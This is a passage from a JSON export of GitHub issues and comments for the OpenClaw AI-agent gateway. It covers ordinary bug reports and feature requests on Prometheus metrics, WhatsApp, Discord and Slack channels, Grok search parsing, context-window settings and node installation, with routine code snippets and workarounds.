OTEL (zero breaking changes)\n- **Event-driven:** Ambos sistemas (OTEL + Prometheus) escutam os mesmos eventos de diagnóstico\n- **Lifecycle management:** Inicialização/cleanup adequados com gateway\n- **Structured logging:** Todos os logs usam `createSubsystemLogger`\n\n## 📝 Configuração\n\n```json\n{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"prometheus\": true  // ← padrão: true quando diagnostics.enabled = true\n  }\n}\n```\n\nPara desabilitar:\n```json\n{\n  \"diagnostics\": {\n    \"enabled\": true,\n    \"prometheus\": false\n  }\n}\n```\n\n## 🧪 Testes\n\n- **17 testes** implementados e passando\n- Cobertura completa: HTTP handler + metrics logic + lifecycle\n- `src/gateway/metrics-http.test.ts` - 6 testes\n- `src/gateway/metrics-prometheus.test.ts` - 11 testes\n\n## 📦 Arquivos\n\n**Criados:**\n- `src/gateway/metrics-prometheus.ts` - Core metrics + event listeners\n- `src/gateway/metrics-http.ts` - HTTP handler para /metrics\n- `src/gateway/metrics-http.test.ts` - Testes HTTP\n- `src/gateway/metrics-prometheus.test.ts` - Testes de métricas\n\n**Modificados:**\n- `src/gateway/server-http.ts` - Integração do handler\n- `src/gateway/server.impl.ts` - Lifecycle management\n- `src/config/types.base.ts` - Campo de config `prometheus`\n\n## 🚀 Deploy\n\nJá disponível em produção:\n- **Tag:** v0.9.0\n- **Commit:** 1789a094e\n- **CHANGELOG:** Atualizado\n\n## 📊 Exemplo de Scrape Config (Prometheus)\n\n```yaml\nscrape_configs:\n  - job_name: 'iagente'\n    static_configs:\n      - targets: ['localhost:18789']\n    metrics_path: '/metrics'\n    scrape_interval: 15s\n```\n\n## ✅ Critérios de Aceitação\n\n- [x] Endpoint GET /metrics retorna formato Prometheus\n- [x] Default metrics expostas (CPU, memory, heap, event loop)\n- [x] Custom metrics incrementam com eventos\n- [x] Histogramas rastreiam durações corretamente\n- [x] Gauges refletem estado atual\n- [x] Todos os testes passando\n- [x] Prometheus consegue fazer scraping com sucesso\n- [x] Performance < 1ms por atualização de métrica\n\n---\n\n**Commits:**\n- feat(gateway): add Prometheus /metrics endpoint for observability (1789a094e)\n- chore: bump version to v0.9.0 (242f22003)\n\n**Release:** https://github.com/alefftech/iagente/releases/tag/v0.9.0"
        }
      ]
    },
    {
      "number": 13651,
      "title": "WhatsApp: old version warning due to browser fingerprint",
      "body": "## Description\n\nWhatsApp shows a warning to chat participants stating the sender (OpenClaw) is \"using an old version of WhatsApp,\" particularly around disappearing messages support.\n\n## Root Cause\n\nOpenClaw's WhatsApp plugin identifies itself as `[\"openclaw\", \"cli\", VERSION]` when creating the Baileys socket (in `createWaSocket`). WhatsApp's servers flag non-standard browser identifiers and show the \"old version\" warning to other participants.\n\n## Suggestion\n\nConsider using a standard browser identifier that WhatsApp recognizes.\n\n## Impact\n\n- Cosmetic but visible to all chat participants\n- May cause disappearing messages features to be flagged as unsupported",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13651",
      "createdAt": "2026-02-10T20:15:00Z",
      "updatedAt": "2026-02-10T20:15:00Z",
      "author": "seelamamar",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 2503,
      "title": "[Feature]: Support http proxy setting in Discord channel",
      "body": "## Summary\nCurrently I can't access discord api from local network.\nHope to support configuring proxies for individual channels to connect to instant messaging software, without requiring global solutions such as TUN.\n\n## Proposed solution\n\nSupport read and http proxy setting in Discord channel\n\n",
      "state": "closed",
      "comments": 6,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/2503",
      "createdAt": "2026-01-27T01:59:33Z",
      "updatedAt": "2026-02-10T20:13:49Z",
      "author": "SWQXDBA",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3821703962,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2503#issuecomment-3821703962",
          "createdAt": "2026-01-30T04:11:47Z",
          "updatedAt": "2026-01-30T04:11:47Z",
          "author": "fy975713384",
          "body": "你是不是也遇到了 Failed to resolve Discord application id 错误，我本地开启 TUN 也没解决"
        },
        {
          "id": 3821940073,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2503#issuecomment-3821940073",
          "createdAt": "2026-01-30T05:39:18Z",
          "updatedAt": "2026-01-30T05:39:18Z",
          "author": "SWQXDBA",
          "body": "> 你是不是也遇到了 Failed to resolve Discord application id 错误，我本地开启 TUN 也没解决\n\n是的，说明你tun没生效/仍然有网络问题。解决了网络问题就行。"
        },
        {
          "id": 3822653900,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2503#issuecomment-3822653900",
          "createdAt": "2026-01-30T09:09:32Z",
          "updatedAt": "2026-01-30T09:09:32Z",
          "author": "SWQXDBA",
          "body": "可以试试本地配置一个代理规则解决。"
        },
        {
          "id": 3822674595,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2503#issuecomment-3822674595",
          "createdAt": "2026-01-30T09:14:28Z",
          "updatedAt": "2026-01-30T09:14:28Z",
          "author": "SWQXDBA",
          "body": "可行方案（本地 workaround）：把 gateway 拆成两个实例，仅 Discord 走代理，QQ/其它直连。\n\n步骤概要：\n1) 复制配置成两份：`clawdbot-qq.json` 与 `clawdbot-discord.json`，分别禁用对方通道，并设置不同 `gateway.port`。\n2) systemd 拆两个服务：\n   - QQ 服务：不加 proxychains，不设置 HTTP(S)_PROXY；`CLAWDBOT_CONFIG_PATH` 指向 `clawdbot-qq.json`；`ExecStart` 直接 node entry.js。\n   - Discord 服务：用 `proxychains4` 包住 `node ... entry.js gateway`；设置 `HTTP_PROXY/HTTPS_PROXY/ALL_PROXY` 指向本地代理（如 127.0.0.1:2080）；`CLAWDBOT_CONFIG_PATH` 指向 `clawdbot-discord.json`。\n3) `systemctl daemon-reload` 后分别 restart 两个服务。\n4) 验证：Discord 日志出现 logged in / gateway connected；QQ 日志恢复 Ready。\n\n补充：若出现浏览器控制端口冲突，可在 Discord 实例的 config 里设置 `browser.enabled=false` 或调整端口。\n该方案无需修改上游代码，能稳定实现‘只让 Discord 走代理’。"
        },
        {
          "id": 3829833684,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2503#issuecomment-3829833684",
          "createdAt": "2026-02-01T00:27:32Z",
          "updatedAt": "2026-02-01T00:27:32Z",
          "author": "sebslight",
          "body": "OpenClaw Maintainer Triage // Issue Closure\n\nHi — this is a joint maintainer effort to keep the repo moving. We’re currently seeing ~30 new issues per hour, and we can’t review every future request without slowing down critical stabilization work. This issue is unlikely to be considered in the near term, so we’re closing it to keep the pipeline moving while we focus on stability.\n\nWe’re very sorry this is happening, but we won’t be able to look at the comments on this issue.\n\nWant to make your request stand out? Submit a PR and report to #pr-thunderdome-dangerzone on Discord — READ THE TOPIC. Give us a clear briefing: what it fixes, who it helps, and why it’s worth shipping.\n\nThanks for understanding and for contributing.\n\n![](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExeXFramtnZWo1ZWM4YmYzcG1zcXE1NWV1eTl3MDZodnk4aWhvM2tqbCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/RWUqVYucDBD4A/giphy.gif)\n"
        },
        {
          "id": 3880455911,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2503#issuecomment-3880455911",
          "createdAt": "2026-02-10T20:13:49Z",
          "updatedAt": "2026-02-10T20:13:49Z",
          "author": "ayanesakura",
          "body": "Hi, I've submitted a PR to fix this: #13637\n\nIt adds a `channels.discord.proxy` config field that threads a proxy-aware fetch (via undici `ProxyAgent`) through the Discord message handler pipeline into `resolveMediaList` → `fetchRemoteMedia`. This mirrors the existing Telegram proxy implementation.\n\nThe fix is minimal (~15 lines of core logic) with full test coverage and docs. Would love to get this merged for users in proxy-required environments."
        }
      ]
    },
    {
      "number": 13648,
      "title": "[Bug] Grok web_search provider returns 'No response': output_text not present in xAI Responses API",
      "body": "## Bug\n\nThe new Grok web_search provider (added in #12419) returns `\"No response\"` for all queries. The API call succeeds (200 OK, takes 13-28s as Grok searches), but the response parsing fails silently.\n\n## Root Cause\n\nIn `runGrokSearch()`, the response is parsed as:\n\n```ts\nconst content = data.output_text ?? \"No response\";\n```\n\nHowever, the xAI `/v1/responses` API does **not** return `output_text` at the top level. Instead, the text is nested inside the `output` array:\n\n```json\n{\n  \"output\": [\n    {\n      \"type\": \"message\",\n      \"content\": [\n        {\n          \"type\": \"output_text\",\n          \"text\": \"The actual response text...\"\n        }\n      ]\n    }\n  ]\n}\n```\n\nSince `data.output_text` is `undefined`, it always falls through to `\"No response\"`.\n\n## Fix\n\nExtract text from `data.output[].content[].text` when `output_text` is not present at the top level:\n\n```ts\nlet content = data.output_text;\nif (!content && Array.isArray(data.output)) {\n  for (const item of data.output) {\n    if (item.type === \"message\" && Array.isArray(item.content)) {\n      for (const part of item.content) {\n        if (part.type === \"output_text\" && part.text) {\n          content = part.text;\n          break;\n        }\n      }\n    }\n    if (content) break;\n  }\n}\n```\n\n## Verified\n\nApplied this patch locally to the bundled JS and confirmed Grok web_search returns full AI-synthesized answers with inline citations.\n\n## Environment\n\n- OpenClaw: 2026.2.9\n- Model: grok-4-1-fast-reasoning\n- Config: `tools.web.search.provider: \"grok\"`\n\nRef: PR #12419",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13648",
      "createdAt": "2026-02-10T20:10:10Z",
      "updatedAt": "2026-02-10T20:12:36Z",
      "author": "octalmage",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3880450576,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13648#issuecomment-3880450576",
          "createdAt": "2026-02-10T20:12:35Z",
          "updatedAt": "2026-02-10T20:12:35Z",
          "author": "octalmage",
          "body": "Happy to submit an actual PR if needed! I'm running it locally now and getting the results. "
        }
      ]
    },
    {
      "number": 7926,
      "title": "Feature: Allow compaction model override (use cheaper model for summarization)",
      "body": "## Problem\n\nCompaction (conversation summarization) always uses the session's current model. When running an expensive model like Opus for conversation quality, the compaction step also runs on Opus — which is overkill for summarization and significantly increases cost.\n\n## Current Behavior\n\n- Compaction model = session model (no override possible)\n- `compaction` config only supports: `mode`, `reserveTokensFloor`, `maxHistoryShare`, `memoryFlush`\n- There is no `compaction.model` option\n\n## Desired Behavior\n\nAllow specifying a separate model for compaction:\n\n```json\n{\n  \"compaction\": {\n    \"model\": \"anthropic/claude-sonnet-4\",\n    \"mode\": \"safeguard\"\n  }\n}\n```\n\nThis would let users run their primary conversation on a high-quality model while using a cheaper model for the mechanical task of summarizing conversation history.\n\n## Use Case\n\n- Primary model: Opus ($15/M input, $75/M output) — for conversation quality\n- Compaction model: Sonnet ($3/M input, $15/M output) — 5x cheaper, sufficient for summarization\n- Or even use a non-Anthropic model (Gemini, etc.) for compaction to avoid metered API costs entirely\n\n## Notes\n\n- Summarization is a well-defined, lower-complexity task that doesn't require top-tier reasoning\n- The compaction prompt is structured (system-generated), so model compatibility should be straightforward\n- This would be especially valuable for users on metered API plans with weekly/monthly budgets\n\n## Environment\n\n- OpenClaw version: 2026.2.1",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7926",
      "createdAt": "2026-02-03T10:15:24Z",
      "updatedAt": "2026-02-10T20:11:07Z",
      "author": "gamer-mitsuha",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3880444514,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7926#issuecomment-3880444514",
          "createdAt": "2026-02-10T20:11:07Z",
          "updatedAt": "2026-02-10T20:11:07Z",
          "author": "1bcMax",
          "body": "Great feature request\\! This aligns well with the broader cost optimization problem.\n\nFor what it's worth, [ClawRouter](https://github.com/BlockRunAI/ClawRouter) (an OpenClaw plugin) already handles this pattern at the routing level:\n\n**How ClawRouter approaches this:**\n\nInstead of one model for everything, it routes each request to the appropriate tier:\n\n| Task Type | Routed Model | Cost/M |\n|-----------|--------------|--------|\n| Simple (summarization, compaction) | gemini-2.5-flash | $0.60 |\n| Medium complexity | grok-code-fast-1 | $1.50 |\n| Complex reasoning | gemini-2.5-pro | $10 |\n\nFor compaction specifically, the router would naturally classify it as a SIMPLE task (summarization = low complexity signal) and route to the cheapest tier.\n\n**Two approaches:**\n1. **This feature request** - explicit `compaction.model` config (gives users direct control)\n2. **Smart routing** - let the router decide based on task complexity (automatic)\n\nBoth are valid\\! The explicit config is simpler for users who just want to set it once. Smart routing handles the general case across all task types.\n\nIf you're interested in the routing approach: [ClawRouter](https://github.com/BlockRunAI/ClawRouter) is MIT licensed and integrates with OpenClaw via `openclaw plugins install @blockrun/clawrouter`."
        }
      ]
    },
    {
      "number": 13649,
      "title": "Status bar and compaction ignore models.providers contextWindow, fall back to 200K default",
      "body": "## Bug: TUI status bar and compaction use DEFAULT_CONTEXT_TOKENS (200K) instead of configured contextWindow\n\n### Environment\n- OpenClaw 2026.2.9\n- Model: claude-opus-4-6 (1M context window)\n- Auth: anthropic API key (Max 5x plan)\n\n### Config\n`models.providers.anthropic.models[0].contextWindow` is set to `1000000` in `openclaw.json`. The generated `models.json` also correctly contains `contextWindow: 1000000`.\n\n### Expected\n- `/status` and TUI status bar show `45k/1000k`\n- Compaction triggers near 1M tokens\n\n### Actual\n- `/status` and TUI status bar show `45k/200k`\n- Compaction appears to trigger around 195K\n\n### Root Cause\n\nTwo different code paths resolve context window size:\n\n1. **`resolveContextWindowInfo()`** (used by compaction runtime) — correctly checks `cfg.models.providers[provider].models[].contextWindow` first. ✅\n\n2. **`getSessionDefaults()`**, **`resolveContextTokens()`**, and the TUI status bar — use `lookupContextTokens()` which reads from `MODEL_CACHE`, an async `Map` populated on import via `discoverModels()`. If the cache isn't populated (race condition on startup, or silent `catch {}` swallowing errors), it falls back to `DEFAULT_CONTEXT_TOKENS = 200000`. ❌\n\nRelevant code in `model-selection` / `reply` bundles:\n\n```js\n// getSessionDefaults — used by TUI status bar\nconst contextTokens = cfg.agents?.defaults?.contextTokens \n  ?? lookupContextTokens(resolved.model)  // MODEL_CACHE lookup\n  ?? DEFAULT_CONTEXT_TOKENS;              // 200000 fallback\n\n// resolveContextWindowInfo — used by compaction\nconst fromModelsConfig = cfg.models.providers[provider].models\n  .find(m => m.id === modelId)?.contextWindow;  // reads config directly ✅\n```\n\n### Workaround\nSetting `agents.defaults.contextTokens: 1000000` in config forces the correct value in both paths. But this shouldn't be necessary when `models.providers` already specifies it.\n\n### Suggested Fix\n`getSessionDefaults()` and `resolveContextTokens()` should check `cfg.models.providers` (like `resolveContextWindowInfo` does) before falling back to `MODEL_CACHE` / `DEFAULT_CONTEXT_TOKENS`.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13649",
      "createdAt": "2026-02-10T20:10:17Z",
      "updatedAt": "2026-02-10T20:10:17Z",
      "author": "zio-fredo",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "tui",
          "config"
        ]
      }
    },
    {
      "number": 13647,
      "title": "WhatsApp outbound sends use phone JID instead of LID — proactive/heartbeat messages go to wrong conversation",
      "body": "## Bug Description\n\nOutbound WhatsApp messages (proactive sends via message tool + heartbeat delivery) are sent to `<phone>@s.whatsapp.net` instead of using the WhatsApp LID. This causes messages to either:\n- **WhatsApp Business**: arrive in a separate/phantom conversation (different from the actual DM)\n- **WhatsApp Normal**: disappear entirely (not delivered anywhere visible)\n\nAuto-replies work correctly because they use `msg.reply()` which preserves the original LID context.\n\n## Environment\n\n- **Version:** 2026.2.9\n- **OS:** Linux (Debian)\n- **Node:** v22.22.0\n- **Setup:** Dedicated number for bot, separate owner number, WhatsApp Web via Baileys\n\n## Root Cause (Source Analysis)\n\n1. `normalizeWhatsAppTarget()` (plugins-DiRwLd6W.js:445) strips any `@lid` suffix and extracts phone number via `extractUserJidPhone()`\n2. `toWhatsappJid()` (utils-DC1T2Vz-.js:61) converts to `<phone>@s.whatsapp.net`\n3. LID mapping files exist in `credentials/whatsapp/default/lid-mapping-*.json` but are **only used for inbound** resolution (`jidToE164`/`readLidReverseMapping`), never for outbound sends\n4. Auto-reply path uses `msg.reply(chunk)` in `deliverWebReply()` which preserves the original message context (including LID) — this is why auto-replies work\n\n## Code References\n\n- `normalizeWhatsAppTarget()`: strips @lid, forces E.164 normalization\n- `toWhatsappJid()`: always appends `@s.whatsapp.net` for non-@ inputs\n- `createWebSendApi.sendMessage()` (reply-DptDUVRg.js ~line 18803): calls `toWhatsappJid(to)` which resolves to phone JID\n- `deliverWebReply()` (reply-DptDUVRg.js ~line 19588): uses `msg.reply()` preserving LID context\n- LID mapping files: `lid-mapping-<phone>.json` (phone→LID) and `lid-mapping-<lid>_reverse.json` (LID→phone) exist in credentials dir\n\n## What Works vs What Doesn't\n\n| Path | Method | Result |\n|------|--------|--------|\n| Auto-reply (response to inbound) | `msg.reply()` via `deliverWebReply` | ✅ Works |\n| Proactive send (message tool) | `sendMessageWhatsApp` → `active.sendMessage(jid)` | ❌ Wrong conversation or lost |\n| Heartbeat delivery | Same outbound path as message tool | ❌ Wrong conversation or lost |\n\n## Steps to Reproduce\n\n1. Configure a dedicated WhatsApp number for the bot (linked via `openclaw channels login`)\n2. Configure heartbeat with `target: \"whatsapp\"` and `to: \"+<owner_phone>\"`\n3. Send a proactive message via the message tool: `message(action=\"send\", channel=\"whatsapp\", target=\"+<owner_phone>\", message=\"test\")`\n4. Observe: message arrives in a separate phantom conversation (Business) or disappears (Normal) instead of the existing DM thread\n\n## Tested Workarounds (None Worked)\n\n- `heartbeat.to` with E.164 phone number\n- `heartbeat.to` with raw LID (`<lid>@lid`) — normalized away by `normalizeWhatsAppTarget`\n- `heartbeat.target: \"whatsapp\"` explicit\n- `selfChatMode: true` + `dmPolicy: \"allowlist\"`\n- Switching from WhatsApp Business to WhatsApp Normal on bot number\n- Sending via message tool with `target: \"<lid>@lid\"`\n\n## Suggested Fix\n\nIn `createWebSendApi.sendMessage()`, after resolving the phone JID, check if a forward LID mapping exists and use it:\n\n```js\nconst phoneJid = toWhatsappJid(to);\nconst phone = phoneJid.replace(\"@s.whatsapp.net\", \"\");\n// Check forward LID mapping (lid-mapping-<phone>.json)\nconst lidMapping = readLidForwardMapping(phone, opts);\nconst resolvedJid = lidMapping ? `${lidMapping}@lid` : phoneJid;\n// Use resolvedJid instead of phoneJid for sock.sendMessage()\n```\n\nSimilarly, `normalizeWhatsAppTarget()` should preserve `@lid` JIDs as valid targets instead of stripping them.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13647",
      "createdAt": "2026-02-10T20:09:38Z",
      "updatedAt": "2026-02-10T20:09:38Z",
      "author": "Kovaryn",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 12354,
      "title": "Gateway crashes on network loss instead of graceful degradation",
      "body": "## Summary\nWhen network connectivity is lost, the gateway crashes instead of gracefully falling back to local/alternative providers.\n\n## Environment\n- OpenClaw version: Latest (npm install)\n- OS: macOS (Darwin 24.6.0 arm64)\n- Node: v23.11.0\n\n## Steps to Reproduce\n1. Configure fallback provider (e.g., local Ollama)\n2. Start gateway with Slack plugin enabled\n3. Disconnect network (e.g., disable Wi-Fi)\n4. Observe gateway crash\n\n## Expected Behavior\nGateway should gracefully fall back to configured fallback provider when primary provider is unreachable.\n\n## Actual Behavior\nSlack plugin throws an unhandled promise rejection that kills the entire gateway process.\n\n## Relevant Logs\n```\nUnhandledPromiseRejection from Slack plugin when network drops\n(Full stack trace available on request)\n```\n\n## Suggested Fix\nWrap network-dependent operations in try/catch with graceful fallback behavior. Consider:\n- Retry with exponential backoff\n- Fall back to configured secondary provider\n- Queue messages for retry when connectivity restored\n\n## Workaround\nNone currently — gateway must be manually restarted after network restoration.",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12354",
      "createdAt": "2026-02-09T05:17:16Z",
      "updatedAt": "2026-02-10T20:09:26Z",
      "author": "lucca-alma",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3869393430,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12354#issuecomment-3869393430",
          "createdAt": "2026-02-09T05:22:07Z",
          "updatedAt": "2026-02-09T05:22:07Z",
          "author": "lucca-alma",
          "body": "**Clarification on fallback scenario:**\n\nThe fallback provider in our case is **local Ollama** (running on the same machine as the gateway). So while network loss breaks connectivity to the primary provider (GitHub Copilot) and the Slack channel, the fallback model itself remains fully reachable.\n\nThe expected behavior would be:\n1. Primary provider unreachable → fall back to local Ollama ✓\n2. Slack channel unreachable → queue messages or gracefully degrade messaging\n\nThe crash happens before any fallback logic can engage — the Slack plugin's unhandled promise rejection kills the process immediately.\n\nThis is a valid use case for resilience: local fallback models specifically exist to provide continuity when cloud providers are unavailable (rate limits, network issues, outages)."
        },
        {
          "id": 3880381902,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12354#issuecomment-3880381902",
          "createdAt": "2026-02-10T19:57:32Z",
          "updatedAt": "2026-02-10T19:57:32Z",
          "author": "lucca-alma",
          "body": "Related: #12835 (Telegram fetch failed crashes) was addressed in 2026.2.x with network error recovery in `src/telegram/network-errors.ts`. \n\nIt appears Slack doesn't have equivalent handling yet. Would it make sense to apply a similar pattern to the Slack plugin?\n\nWe're on 2026.2.6-3 — Slack plugin still crashes on network loss while Telegram would presumably recover."
        },
        {
          "id": 3880436862,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12354#issuecomment-3880436862",
          "createdAt": "2026-02-10T20:09:26Z",
          "updatedAt": "2026-02-10T20:09:26Z",
          "author": "lucca-alma",
          "body": "> Related: [#12835](https://github.com/openclaw/openclaw/issues/12835) (Telegram fetch failed crashes) was addressed in 2026.2.x with network error recovery in `src/telegram/network-errors.ts`.\n> \n> It appears Slack doesn't have equivalent handling yet. Would it make sense to apply a similar pattern to the Slack plugin?\n> \n> We're on 2026.2.6-3 — Slack plugin still crashes on network loss while Telegram would presumably recover.\n\nSorry, Claude didn't notice the commits linked here, was only reviewing comments. Seems we are already on track - thank you!\n"
        }
      ]
    },
    {
      "number": 13326,
      "title": "[Bug]: Internal reasoning and raw tool calls leak into Telegram chat even when reasoning is disabled",
      "body": "### Summary\n\nThe bot's internal reasoning (Chain of Thought) and raw tool invocation logs (e.g., [Historical context...]) are being sent directly to the Telegram user as message content. This occurs even when the user has explicitly disabled reasoning visibility (/reasoning off). Furthermore, the final intended response is sometimes missing or malformed.\n\n### Steps to reproduce\n\n1. In a Telegram chat with the bot, disable reasoning by sending /reasoning and selecting off.\n2. Send a complex request that triggers tool usage (e.g., \"Check the system logs for error X\").\n3. Observe the bot's response.\nExpected behavior\n\nThe user should only see the final, processed response from the agent (e.g., \"I checked the logs and found...\"). All internal thought processes and tool execution details should be hidden or shown only as status indicators.\n\n### Actual behavior\n\nThe user receives raw, unformatted internal text, including:\n\n1. Reasoning headers (e.g., \"Analyzing Error Logs\", \"Investigating...\").\n2. Raw tool call artifacts (e.g., [Historical context: a different model called tool \"exec\"...]).\n3. The actual final response is often buried or missing entirely.\nEnvironment\n\n• OpenClaw version: 2026.2.9\n• OS: macOS 15.2 (Darwin 25.2.0)\n• Install method: pnpm\n• Model: google-antigravity/gemini-3-pro-high\nLogs or screenshots\n\n### User Screenshot:\nThe attached screenshot shows the bot outputting:\n<img width=\"1379\" height=\"1640\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/77c8f867-43fc-4c92-9534-4fc92ceca173\" />\n\n```\n**Analyzing Error Logs**\nI've reviewed the log...\n[Historical context: a different model called tool \"exec\" with arguments: ...]\n\n```\n\nThis content should have been invisible to the user.\n\n",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13326",
      "createdAt": "2026-02-10T10:37:51Z",
      "updatedAt": "2026-02-10T20:04:54Z",
      "author": "Oucimi",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13645,
      "title": "[Bug]: Output blocked by content filtering policy [object Object]",
      "body": "## Summary\nMy clawbot is in a loop. Every communication is answered with \n\nOutput blocked by content filtering policy\n[object Object]\n\n\nWhat went wrong?\nI ansked clawbot to change the open source license in my GitHub to bsl (he has anccess with a token to the GitHub) and clawbot took some time to answer but the answer was the error message. \nI tried other questions but from this point on only the error was the answer. \n\n## Steps to reproduce\n\n1. Not sure\n2.\n3.\n\n## Expected behavior\nSimple task , simple answer/action \n\nWhat did you expect to happen?\nThat he would change the license in the GitHub\n\n## Actual behavior\nNo change was made in the GitHub and I received the error message Output blocked by content filtering policy\n[object Object] from now on in every message\n\nWhat actually happened?\nError message \n\n## Environment\nTelegram on iPhone 16\n\n- Clawdbot version: latest\n- OS: Linux\n- Install method (pnpm/npx/docker/etc): docker\n\n## Logs or screenshots\n\nPaste relevant logs or add screenshots (redact secrets).\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13645",
      "createdAt": "2026-02-10T20:03:05Z",
      "updatedAt": "2026-02-10T20:03:05Z",
      "author": "oldschoolag",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": []
      }
    },
    {
      "number": 13642,
      "title": "[Bug]: `openclaw node install` tries to enable `openclaw-gateway.service` instead of node service",
      "body": "## Summary\n\n`openclaw node install` on a node-only machine fails because it attempts to `systemctl enable openclaw-gateway.service` instead of creating/enabling a node-specific service unit.\n\n## Steps to reproduce\n\n1. Install openclaw v2026.2.9 on a Linux machine intended as a **node only** (no gateway)\n2. Run:\n   ```bash\n   OPENCLAW_GATEWAY_TOKEN=<token> openclaw node install --host <gateway-ip> --port 18789 --display-name \"my-node\"\n   ```\n\n## Expected behavior\n\nA systemd service for the **node host** is created and enabled (e.g., `openclaw-node.service`).\n\n## Actual behavior\n\n```\nNode install failed: Error: systemctl enable failed: Failed to enable unit: Unit file openclaw-gateway.service does not exist.\n```\n\nThe command tries to enable `openclaw-gateway.service`, which doesn't exist on a node-only machine.\n\n## Workaround\n\nManually create a systemd unit:\n\n```ini\n# /etc/systemd/system/openclaw-node.service\n[Unit]\nDescription=OpenClaw Node Host\nAfter=network-online.target\nWants=network-online.target\n\n[Service]\nType=simple\nEnvironment=OPENCLAW_GATEWAY_TOKEN=<token>\nExecStart=/usr/bin/openclaw node run --host <gateway-ip> --port 18789 --display-name \"my-node\"\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target\n```\n\nThen:\n```bash\nsystemctl daemon-reload && systemctl enable --now openclaw-node.service\n```\n\nThis works correctly — the node connects and stays connected.\n\n## Environment\n\n- **OpenClaw version:** 2026.2.9 (33c75cb)\n- **OS:** Ubuntu 24.04 (Linux 6.8.0)\n- **Init system:** systemd\n- **Node-only machine** (no gateway installed)\n\n## Related\n\nThis may share root cause with #4833 — both suggest the node-mode code paths have received less testing than gateway-mode.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13642",
      "createdAt": "2026-02-10T20:00:34Z",
      "updatedAt": "2026-02-10T20:00:34Z",
      "author": "TerminalGravity",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway"
        ]
      }
    },
    {
      "number": 4833,
      "title": "[Bug]: `openclaw node run` fails silently with \"1008: pairing required\" when connecting to a remote gateway",
      "body": "# `openclaw node run` fails silently with \"1008: pairing required\" when connecting to a remote gateway\n\n## Summary\nWhen connecting a node to a remote gateway (e.g., via Tailscale) using `openclaw node run`, the connection is immediately rejected with WebSocket code `1008: pairing required` (or \"device identity required\") without ever creating a pending pairing request on the Gateway.\n\nThis happens because the CLI does not automatically generate or persist a Device Identity (ID + keys) by default when running in node mode, causing the Gateway's strict handshake validation to fail before the pairing logic is triggered.\n\n## Steps to reproduce\n1. Setup a Gateway on Host A (Remote).\n2. On Host B (Node), configure the remote URL: `openclaw config set gateway.remote.url wss://...`\n3. Run `openclaw node run` (without flags).\n\n## Expected behavior\nThe CLI should generate a transient or persistent Device Identity automatically, allowing the Gateway to accept the handshake and queue a \"Pending Pairing Request\" for the administrator to approve.\n\n## Actual behavior\nThe process exits immediately:\n`node host gateway closed (1008): pairing required`\nNo pending request appears on the Gateway.\n\n**Workaround:**\nThe user must manually provide identity flags to bypass this:\n`openclaw node run --node-id my-node --display-name \"My Node\" ...`\n\n## Environment\n- **OpenClaw version:** 2026.1.29 (a5b4d22)\n- **Mode:** Remote (Tailscale/WSS)",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4833",
      "createdAt": "2026-01-30T18:42:37Z",
      "updatedAt": "2026-02-10T20:00:06Z",
      "author": "machineshake",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3832470117,
